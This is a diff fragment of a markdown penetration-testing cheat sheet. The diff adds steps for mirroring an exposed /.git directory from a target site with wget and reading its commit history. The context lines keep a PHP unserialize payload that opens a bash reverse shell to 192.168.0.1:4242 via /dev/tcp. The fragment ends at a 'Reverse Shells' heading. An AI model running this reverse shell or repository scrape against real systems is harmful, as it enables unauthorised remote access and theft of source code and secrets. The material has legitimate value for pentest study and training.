@@ -21,6 +21,26 @@ https://notsosecure.com/remote-code-execution-via-php-unserialize/
 + serialize as necessary as a parameter
 public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/192.168.0.1/4242 0>&1\'"); ?>';
 ```
++ <b>Check for exposed /.git directory</b>
+Clone repository:
+```
+wget --mirror -I .git TARGET.COM/.git/ 
+```
+
+Get files from last commit:
+```
+git checkout -- .
+```
+
+Check out commit log:
+```
+git log
+```
+
+Check out previous commit:
+```
+git checkout 123456789
+```
 
 ## Reverse Shells:
 
